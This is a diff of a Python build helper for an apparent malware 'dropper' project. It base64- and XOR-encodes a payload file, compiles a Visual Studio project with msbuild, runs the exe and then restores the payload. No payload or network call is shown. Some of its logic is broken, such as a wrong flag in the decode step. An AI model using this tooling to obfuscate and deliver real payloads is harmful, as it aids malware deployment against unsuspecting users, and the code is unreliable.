@@ -1,3 +1,4 @@
+import os
 import subprocess
 import argparse
 import base64
@@ -40,21 +41,13 @@ def parse_args():
 	parser.add_argument("--set-and-use-xor", type=int, default=0)
 	parser.add_argument("--use-base64-and-xor-default", action="store_true")
 	parser.add_argument("--use-hardcode", action="store_true")
+	parser.add_argument("--use-logging", action="store_true")
 
 	args = parser.parse_args()
-	arr = []
-	
-	arr.append(args.release)
-	arr.append(args.architecture)
-	arr.append(args.use_base64)
-	arr.append(args.use_115_as_xor)
-	arr.append(args.set_and_use_xor)
-	arr.append(args.use_base64_and_xor_default)
-	arr.append(args.use_hardcode)
 
-	return arr		
+	return args
 
-def read_file_information_from_script_info(script_info):
+def read_file_information_from_script_info(script_info, release_mode):
 	file_information = {}
 
 	print("The reading of script_info.txt requires that \"file_exe_path = \", \"file_payload_path = \", and \"file_path = \" are all formatted EXACTLY as seen.\n")
@@ -62,117 +55,149 @@ def read_file_information_from_script_info(script_info):
 		for line in fr:
 			line = line.strip("\n")
 			line = line.strip("\t")
-			if (line[0:16] == "file_exe_path = "):
-				file_information["file_exe_path"] = line[16:]
-				print("file_exe_path is: " + line[16:])
-			if (line[0:20] == "file_payload_path = "):
+			if (release_mode == True):
+				if (line.startswith("file_release_exe_path = ")):
+					file_information["file_exe_path"] = line[24:]
+					print(f"file_exe_path is: {line[24:]}")
+			else:
+				if (line.startswith("file_debug_exe_path = ")):
+					file_information["file_exe_path"] = line[22:]
+					print(f"file_exe_path is: {line[22:]}")
+			if (line.startswith("file_payload_preserve_path = ")):
+				file_information["file_payload_preserve_path"] = line[29:]
+				print(f"file_payload_preserve_path is: {line[29:]}")
+			if (line.startswith("file_payload_path = ")):
 				file_information["file_payload_path"] = line[20:]
-				print("file_payload_path is: " + line[20:])
-			if (line[0:12] == "file_path = "):
+				print(f"file_payload_path is: {line[20:]}")
+			if (line.startswith("file_path = ")):
 				file_information["file_path"] = line[12:]
-				print("file_path is: " + line[12:])
+				print(f"file_path is: {line[12:]}")
 	print("\n")
 	return file_information
 
-def base64_file(payload_file, encode, decode):
+def base64_file(payload_file, encode, decode, payload_preserve_path, log_boolean):
 	with open(payload_file, "r", encoding="utf-8") as file_read:
 		payload = file_read.read()
-	print(f"This is the original version of your payload: {payload}")
-	payload = payload.encode('utf-8')
+		print("This is the original version (in the base64 function) of your payload: " + payload)
+
+	payload_bytes = payload.encode("utf-8")
+
 	if (encode):
-		encoded_payload = base64.b64encode(payload)
-		print(f"This is the base64 encoded version of your payload: {encoded_payload}")
-		encoded_payload = encoded_payload.decode('utf-8')
-		with open(payload_file, "w") as file_write:
+		if (log_boolean == True):
+			with open(payload_preserve_path, "a", encoding="utf-8") as file_preserve_read:
+				string_before_payload_in_preserve_file = "This is what is preserved before applying base64 to the payload. "
+				file_preserve_read.write(string_before_payload_in_preserve_file + payload + "\n\n")
+				print("Original base64 input preserved.")
+
+		encoded_payload_bytes = base64.b64encode(payload_bytes)
+		encoded_payload = encoded_payload_bytes.decode("utf-8")
+		print("This is the base64 encoded version of your payload: " + encoded_payload)
+		with open(payload_file, "w", encoding="utf-8") as file_write:
 			file_write.write(encoded_payload)
-			file_write.close()
 
 	if (decode):
-		decoded_payload = base64.b64decode(payload)
-		decoded_payload = decoded_payload.decode('utf-8')
-		print(f"This is the base64 decoded version of your payload: {decoded_payload}")
-		
-		with open(payload_file, "w") as file_write:
+		decoded_payload_bytes = base64.b64decode(payload_bytes)
+		decoded_payload = decoded_payload_bytes.decode("utf-8")
+		print("This is the base64 decoded version of your payload: " + decoded_payload)
+		with open(payload_file, "w", encoding="utf-8") as file_write:
 			file_write.write(decoded_payload)
-			file_write.close()
 
-def xor_file(payload_file, xor_key):
-	if (xor_key > 255):
-		print("This script only lets xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
-		xor_key = 255
+def xor_file(payload_file, xor_key, encode, payload_preserve_path, log_boolean):
 
-	with open(payload_file, "rb") as file_read: 
+	with open(payload_file, "r", encoding="utf-8") as file_read: 
 		payload = file_read.read()
-		file_read.close()
-	print(f"This is the original version of your payload: {payload}")
-	encoded_payload = bytes([char ^ xor_key for char in payload])
-	print(f"This is the xor encoded or decoded version of your payload: {encoded_payload}")
+		
+	payload_bytes = payload.encode("utf-8")
 
-	with open(payload_file, "wb") as file_write:
-		file_write.write(payload)
-		file_write.close()
+	if (encode):
+		if (log_boolean):
+			with open(payload_preserve_path, "a", encoding="utf-8") as preserve_file_write:
+				string_before_payload_in_preserve_file = "This is what is preserved before applying xor to the payload."
+				message = string_before_payload_in_preserve_file + " " + payload + "\n\n"
+				preserve_file_write.write(message)
+				print("Original xor input preserved.")
+	
+	print("This is the original version of your payload: " + payload)
+	encoded_payload = bytes([char ^ xor_key for char in payload_bytes])
+	encoded_payload_bytes = encoded_payload.decode("utf-8")	
+
+	print("This is the xor encoded or decoded version of your payload: " + encoded_payload_bytes)
+
+	with open(payload_file, "w", encoding="utf-8") as file_write:
+
+		file_write.write(encoded_payload_bytes)
 
 	return payload_file
 
 def run_program(run_file):
-	result = subprocess.run([run_file])
-	print(f"The return code of the run file was {result.returncode}")
+	if not os.path.isfile(run_file):
+		print("The given exe was not found.")
+	else:
+		result = subprocess.run([run_file])
+		print(f"The return code of the run file was {result.returncode}")
 
 def main():	
 	
-	flag_arr = parse_args()
-	#script_info_location = r"C:\Users\adind\Dropper\Walmart-version-of-Dropper\script_info.txt"
+	args = parse_args()
+	script_info_location = r"C:\Users\adind\Dropper\Walmart-version-of-Dropper\script_info.txt"
 
-	if (flag_arr[6] != True):
+	if (args.use_hardcode != True):
 		file_path = input("Give the file path to the file you want to pass in to msbuild so that msbuild can compile it (should end in .vcxproj) : ")
 		file_payload_path = input("Set the default file path to the payload that the dropper will inject: ")
 		file_exe_path = input("Give the file path to the place where the exe will place after msbuild compiles it (should have an exe file extension): ")
+		file_payload_preserve_path = input("Give the location of the file that will take the original contents of the payload file: ")
 
 	else:
-		script_dict = read_file_information_from_script_info(script_info_location)	
+		script_dict = read_file_information_from_script_info(script_info_location, args.release)	
 		file_path = script_dict.get("file_path")
 		file_payload_path = script_dict.get("file_payload_path")
 		file_exe_path = script_dict.get("file_exe_path")
+		file_payload_preserve_path = script_dict.get("file_payload_preserve_path")
 
-	if (file_exe_path == "" or file_payload_path == "" or file_path == ""):
-		print("One or more of the variables was blank.")
+	if (file_exe_path == "" or file_payload_path == "" or file_path == "" or file_payload_preserve_path == ""):
+		print("One or more of the variables in script_info.txt or the cmd line was blank.")
 	else:
-		if (flag_arr[2] == True or flag_arr[5] == True):
+		with open(file_payload_preserve_path, "w", encoding="utf-8") as file_write:
+			file_write.write("")
+			print("file_payload_preserve_path has been reset.")
+
+
+		if (args.use_base64 == True or args.use_base64_and_xor_default == True):
 			encode = True
 			decode = False
-			base64_file(file_payload_path, encode, decode)
-	
-		if (flag_arr[3] == True or flag_arr[5] == True):
-			xor_file(file_payload_path, 115)
+			base64_file(file_payload_path, encode, decode, file_payload_preserve_path, args.use_logging)
+
+		if (args.use_115_as_xor == True or args.use_base64_and_xor_default == True):
+			encode = True
+			xor_file(file_payload_path, 115, encode, file_payload_preserve_path, args.use_logging)
 			print("The xor key used is 115")
 		else:
-			xor_file(file_payload_path, flag_arr[4])
-			print(f"This xor key used is {flag_arr[4]} \n")
+			if (args.set_and_use_xor > 255):
+				print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
+				args.set_and_use_xor = 255
+			elif (args.set_and_use_xor < 0):
+				print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
+				args.set_and_use_xor = 255
+
+			xor_file(file_payload_path, args.set_and_use_xor, True, file_payload_preserve_path, args.use_logging)
+			print(f"This xor key used is {args.set_and_use_xor} \n")
 		
 
-		run_msbuild(file_path, flag_arr[0], flag_arr[1])
+		run_msbuild(file_path, args.release, args.architecture)
 
 		run_program(file_exe_path)
-
-		if (flag_arr[3] == True or flag_arr[5] == True):
-			xor_file(file_payload_path, 115)
+		
+		# decoding payload
+		if (args.set_and_use_xor == True or args.use_base64_and_xor_default == True):
+			xor_file(file_payload_path, 115, False, file_payload_preserve_path, args.use_logging)
 			print("The xor key used is 115")
 		else:
-			xor_file(file_payload_path, flag_arr[4])
-			print(f"This xor key used is {flag_arr[4]} \n")
+			xor_file(file_payload_path, args.set_and_use_xor, False, file_payload_preserve_path, args.use_logging)
+			print(f"This xor key used is {args.set_and_use_xor} \n")
 		
-		
-		if (flag_arr[2] == True or flag_arr[5] == True):
+		if (args.use_base64 == True or args.use_base64_and_xor_default == True):
 			encode = False
 			decode = True
-			base64_file(file_payload_path, encode, decode)
+			base64_file(file_payload_path, encode, decode, file_payload_preserve_path, args.use_logging)
 
-		# 0 -> build mode (release or debug)
-		# 1 -> platform (x86 or x64)
-		# 2 -> Whether the program uses base 64 
-		# 3 -> Uses 115 as the xor key.
-		# 4 -> The xor key if the program uses xor (default is 0)
-		# 5 -> Runs base64 and xor with key 115 automatically
-		# 6 -> Hardcoded argument
 main()
-
